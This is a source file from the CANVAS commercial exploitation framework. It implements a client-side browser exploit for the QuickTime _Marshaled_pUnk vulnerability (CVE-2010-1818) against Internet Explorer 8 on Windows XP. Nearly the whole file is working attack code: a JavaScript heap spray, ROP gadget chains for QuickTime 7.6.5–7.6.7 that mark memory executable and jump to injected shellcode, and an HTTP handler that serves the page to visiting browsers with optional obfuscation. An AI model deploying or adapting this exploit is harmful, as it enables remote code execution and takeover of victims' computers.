#! /usr/bin/env python
# -*- coding: utf-8 -*-

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator
from string import ascii_lowercase
from random import choice

NAME        = 'quick_punk'
DESCRIPTION = 'QuickTime 7.6.5 _Marshaled_pUnk Vulnerability'
VERSION     = '1.0'

DOCUMENTATION = {}
DOCUMENTATION['VENDOR'           ] = 'Apple'
DOCUMENTATION['Date public'      ] = '08/30/2010'
DOCUMENTATION['References'       ] = ['http://zerodayinitiative.com/advisories/ZDI-10-168/']
DOCUMENTATION['Repeatability'    ] = 'Infinite'
DOCUMENTATION['VersionsAffected' ] = '7.6.5'
DOCUMENTATION['CVE Name'         ] = 'CVE-2010-1818'
DOCUMENTATION['CVE Url'          ] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1818'
DOCUMENTATION['Notes'            ] = "Abyssec 0day"
DOCUMENTATION['CVSS'             ] = 9.3

PROPERTY = {}
PROPERTY['TYPE'     ] = 'Exploit'
PROPERTY['SITE'     ] = 'Clientside'
PROPERTY['ARCH'     ] = [['Windows']]
PROPERTY['VERSION'  ] = ['XP']
PROPERTY['DELIVERY' ] = 'HTTP'
PROPERTY["Notes"    ] = ""

NOTES = """
Tested on:
Windows XP Professional SP3 under IE 8
"""

CHANGELOG = ""

targets={
    0:['N/A', None, 0],
    1:['Windows XP SP3 - IE8 ', 'en-us', 0],
    #  Name       language       Get Stack           kernel32!VirtualProtect
}

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.version = 0
        self.name = NAME
        self.setInfo(DESCRIPTION)
        self.filename = "".join([choice(ascii_lowercase) for x in range(8)]) + ".html"

        # Set up our javascript obfuscator, this could be done in httpclientside class
        self.jsObfuscator = JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")

        # we want clientd to give us a plugin dict
        self.plugin_info = None

        return

    def is_vulnerable(self, info_dict):
        """
        Check to make sure this is something we want to run. This is called by cliend.py
        """
        if "MSIE" in info_dict['user_agent']:
            return 50
        
        return 0

    def makefile(self, request_header=None):
        """
        Generate the HTML to be included in the exploit file
        """
        filedata="""
        <html>
        <head></head>
        <body onload="setTimeout('exploit();', 1000)">
        <object id="qt" classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"></object>
        <div id="exploit"></div>
        <script type="text/javascript">
        """

        script = """
        function hexa(val)
        {
            var str = new Number(val).toString(16);
            while (str.length < 4)
                str = "0" + str;

            return str;
        }

        function myescape(addr)
        {
            var str = "";
            str = "%u" + hexa(addr & 0xffff) + "%u" + hexa((addr >> 16) & 0xffff);
            return unescape(str);
        }

        function qt_767()
        {
            // This is the bug
            // eax is our pointer, we point it to our fake vtable
            // 7750dc93 8b08            mov     ecx,dword ptr [eax]  ds:0023:80000000=????????
            // 7750dc95 8d5508          lea     edx,[ebp+8]
            // 7750dc98 52              push    edx
            // 7750dc99 ff7510          push    dword ptr [ebp+10h]
            // 7750dc9c ff750c          push    dword ptr [ebp+0Ch]
            // 7750dc9f 50              push    eax
            // 7750dca0 ff510c          call    dword ptr [ecx+0Ch]
            //
            // QuickTimeStreaming.qtx
            // ROP Gadget 1:
            //
            // 6785FF86   94               XCHG EAX,ESP
            // 6785FF87   5F               POP EDI
            // 6785FF88   5E               POP ESI
            // 6785FF89   C3               RETN
            ///
            // ROP Gadget 2: this dereferences the address of VirtualAlloc from the IAT
            // 677B0244   8B01             MOV EAX,DWORD PTR DS:[ECX]
            // 677B0246   C3               RETN
            ///
            // ROP Gadget 3: this calls VirtualAlloc(0, size, 0x1000, 0x40)
            // 677A509E   FFD0             CALL EAX
            // 677A50A0   C3               RETN
            //
            /// ROP Gadget 4
            // 678D4FD5   97               XCHG EAX,EDI
            // 678D4FD6   C3               RETN
            ///
            // ROP Gadget 5
            // 677A9B4B   8BC7             MOV EAX,EDI
            // 677A9B4D   5E               POP ESI
            // 677A9B4E   C3               RETN
            ///
            // ROP Gadget 6
            // 677A1E27   59               POP ECX
            // 677A1E28   C3               RETN
            ///
            // ROP Gadget 7
            // 678178D2   F3:A5            REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS>
            // 678178D4   5F               POP EDI
            // 678178D5   5E               POP ESI
            // 678178D6   C3               RETN
            ///
            // ROP Gadget 8
            // 677A509E   FFD0             CALL EAX
            // 677A50A0   C3               RETN
            /// Break on 7750dc93 for debugging

            // Sprayed address we can reach to.
            // 20282CB8  20282CB8
            self_address = 0x20282CB8;

            gadget_1     = 0x6785FF86;
            gadget_2     = 0x677B0244;
            gadget_3     = 0x677A509E;
            gadget_4     = 0x678D4FD5;
            gadget_5     = 0x677A9B4B;
            gadget_6     = 0x677A1E27;
            gadget_7     = 0x678178D2;
            gadget_8     = 0x677A509E;
            valloc       = 0x6791009C;              // VirtualAlloc IAT Entry

            fake_vtable  = myescape(self_address);      // edi = will point to this
            fake_vtable += myescape(0xcafecafe);        // dummy
            fake_vtable += myescape(gadget_6);          // pop crap from stack (this will skip gadget_1)
            fake_vtable += myescape(gadget_1);          // Get me ESP
            fake_vtable += myescape(gadget_6);          // ecx = VirtualAlloc@IAT
            fake_vtable += myescape(valloc);
            fake_vtable += myescape(gadget_2);          // eax = VirtualAlloc
            fake_vtable += myescape(gadget_3);          // call VirtualAlloc(0, size, 0x1000, 0x40)
            fake_vtable += myescape(0x0);               // NULL
            fake_vtable += myescape(0x10000);           // size
            fake_vtable += myescape(0x3000);            // MEM_COMMIT | MEM_RESERVE
            fake_vtable += myescape(0x40);              // PAGE_EXECUTE_READWRITE
            fake_vtable += myescape(gadget_4);          // edi = eax (valloced memory)
            fake_vtable += myescape(gadget_5);          // eax = edi (save it)
            fake_vtable += myescape(self_address+84);   // shellcode address
            fake_vtable += myescape(gadget_6);          // ecx = sizeof(shellcode)
            fake_vtable += myescape(0x1000);            // sizeof(shellcode)
            fake_vtable += myescape(gadget_7);          // memcpy
            fake_vtable += myescape(0xbadc0ded);        // dummy
            fake_vtable += myescape(0xbadc0ded);        // dummy
            fake_vtable += myescape(gadget_8);          // Call shellcode
            fake_vtable += unescape("SHELLCODE");       // @84

            var crapuccino = myescape(0xbadc0ded);

            while(fake_vtable.length < 0x7fff00)
                fake_vtable += fake_vtable;

            h1 = [];
            h1[0] = fake_vtable + crapuccino;

            var i;
            for (i = 1 ; i < 20 ; i++)
                h1[i] = h1[0].substring(0, h1[0].length)

            var object = '<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" width="0" height="0">'
                    + '<PARAM name="_Marshaled_pUnk" value="' + self_address + '"/>'
                    + '</object>';

            document.getElementById("exploit").innerHTML = object;
        }

        function qt_765()
        {
            // This is the bug
            // eax is our pointer, we point it to our fake vtable
            // 7750dc93 8b08            mov     ecx,dword ptr [eax]  ds:0023:80000000=????????
            // 7750dc95 8d5508          lea     edx,[ebp+8]
            // 7750dc98 52              push    edx
            // 7750dc99 ff7510          push    dword ptr [ebp+10h]
            // 7750dc9c ff750c          push    dword ptr [ebp+0Ch]
            // 7750dc9f 50              push    eax
            // 7750dca0 ff510c          call    dword ptr [ecx+0Ch]
            //
            // QuickTimeStreaming.qtx
            // ROP Gadget 1:
            //
            // 673BEED5   94               XCHG EAX,ESP
            // 673BEED6   5B               POP EBX
            // 673BEED7   59               POP ECX
            // 673BEED8   C3               RETN
            //
            /// ROP Gadget 2:
            //
            // 673BC20E   5B               POP EBX
            // 673BC20F   C3               RETN
            ///
            // ROP Gadget 3: this dereferences the address of VirtualAlloc from the IAT
            //
            // 673B1F38   8B01             MOV EAX,DWORD PTR DS:[ECX]
            // 673B1F3A   C3               RETN
            ///
            // ROP Gadget 4: this calls VirtualAlloc(0, size, 0x1000, 0x40)
            // 6744568A   FFD0             CALL EAX
            // 6744568C   C3               RETN
            //
            /// ROP Gadget 5
            // 6743E26B   97               XCHG EAX,EDI
            // 6743E26C   0100             ADD DWORD PTR DS:[EAX],EAX
            // 6743E26E   8948 0C          MOV DWORD PTR DS:[EAX+C],ECX
            // 6743E271   C3               RETN
            ///
            // ROP Gadget 6
            // 67448AFA   8BC7             MOV EAX,EDI
            // 67448AFC   5E               POP ESI
            // 67448AFD   C3               RETN
            ///
            // ROP Gadget 7
            // 673B1122   59               POP ECX
            // 673B1123   C3               RETN
            ///
            // ROP Gadget 8
            // 6743CD4F   F3:A5            REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI]
            // 6743CD51   5F               POP EDI
            // 6743CD52   5E               POP ESI
            // 6743CD53   C3               RETN
            ///
            // ROP Gadget 9
            // 673C79A5   FFE0             JMP EAX
            //
            /// Break on 7750dc93 for debugging

            // Sprayed address we can reach to.
            self_address = 0x10022C98;

            gadget_1     = 0x673BEED5;
            gadget_2     = 0x673BC20E
            gadget_3     = 0x673B1F38;
            gadget_4     = 0x6744568A;
            gadget_5     = 0x6743E26B;
            gadget_6     = 0x67448AFA;
            gadget_7     = 0x673B1122;
            gadget_8     = 0x6743CD4F;
            gadget_9     = 0x673C79A5;
            valloc       = 0x674601AC;              // VirtualAlloc IAT Entry

            fake_vtable  = myescape(0xcafecafe);
            fake_vtable += myescape(self_address);      // ecx@1 will point to this
            fake_vtable += myescape(valloc);            // ecx@2 will have VirtualAlloc@IAT
            fake_vtable += myescape(gadget_2);          // pop crap
            fake_vtable += myescape(gadget_1);          // Get me ESP
            fake_vtable += myescape(gadget_3);          // EAX = [IAT:VirtualAlloc]
            fake_vtable += myescape(gadget_4);          // call VirtualAlloc
            fake_vtable += myescape(0x0);               // NULL
            fake_vtable += myescape(0x10000);           // size
            fake_vtable += myescape(0x3000);            // MEM_COMMIT | MEM_RESERVE
            fake_vtable += myescape(0x40);              // PAGE_EXECUTE_READWRITE
            fake_vtable += myescape(gadget_5);          // set edi = eax
            fake_vtable += myescape(gadget_6);          // set eax = edi ; set esi = shellcode
            fake_vtable += myescape(self_address+76);   // shellcode address
            fake_vtable += myescape(gadget_7);          // ecx = sizeof(shellcode)
            fake_vtable += myescape(0x1000);            // sizeof(shellcode)
            fake_vtable += myescape(gadget_8);          // memcpy
            fake_vtable += myescape(0xbadc0ded);        // dummy
            fake_vtable += myescape(0xbadc0ded);        // dummy
            fake_vtable += myescape(gadget_9);          // jmp to shellcode
            fake_vtable += unescape("SHELLCODE");       // @76

            var crapuccino = myescape(0xbadc0ded);

            while(fake_vtable.length < 0x7fff00)
                fake_vtable += fake_vtable;

            h1 = [];
            h1[0] = fake_vtable + crapuccino;

            var i;
            for (i = 1 ; i < 20 ; i++)
                h1[i] = h1[0].substring(0, h1[0].length)

            var object = '<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" width="0" height="0">'
                    + '<PARAM name="_Marshaled_pUnk" value="' + self_address + '"/>'
                    + '</object>';

            document.getElementById("exploit").innerHTML = object;
        }

        function exploit()
        {
            /// NOTE to the reader, I KNOW I've copied some parts of the exploit
            /// that might be shared by all the versions of the exploit but this
            /// way is easier to debug and extend.

            var version = qt.GetQuickTimeVersion();

            /// Versions 7.6.7 and 7.6.6 shoudl work with the same ROP
            if(version == "7.6.7")
                qt_767();
            else if(version == "7.6.6")
                qt_767();
            else if(version == "7.6.5")
                qt_765();
        }
        """

        script = script.replace('SHELLCODE', urluencode(self.shellcode))

        #filedata += self.jsObfuscator.obfuscate(script)
        filedata += script
        filedata += """
        </script>
        </body>
        </html>
        """

        return filedata

    def makesploit(self, clientheader, clientbody):
        """
        Called automatically
        """
        from libs.spkproxy import header, body

        # header is used to store request and reponse headers
        header = header('SERVER')
        body = body()

        if clientheader.URL.count(self.filename):
            self.log('Serving HTML file')

            # Create the shellcode (self.shellcode)
            self.createShellcode()

            # Create the HTML Contents
            html = self.makefile(request_header = clientheader)

            body.setBody(html)
            header.addHeader('Content-Type','text/html')
            header.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
        else:
            self.log('Redirecting to self')
            header.status='302'
            header.addHeader('Location', self.filename)
            header.addHeader('Content-Type','text/html')

        return header,body

    def neededListenerTypes(self):
        return self.clientSideListenerTypes()

    def getArgs(self):
        """
        Get the required parameters from the program that
        ran the exploit (i.e. CANVAS GTK GUI or Command line)
        """
        self.host = self.target.interface
        self.getarg("filename")
        self.getarg("language")

        return

    def displayVersions(self):
        """
        XXX Called from the cmd line or canvas to show the available versions?
        """
        for t in targets.keys():
            print 'Version %d: %s'%(t, targets[t][0])

        return

    def run(self):
        """
        Run is the firth method that is automatically executed by CANVAS
        """

        # Populate the needed arguments of the exploit
        self.getArgs()

        # Build the html that triggers the vulnerability
        filedata = self.makefile()

        self.log('Opening %s for output'%(self.filename))

        fd = file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()

        self.debuglog('Wrote to %s'%(self.filename), color="red")
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app = theexploit()

    ret = standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
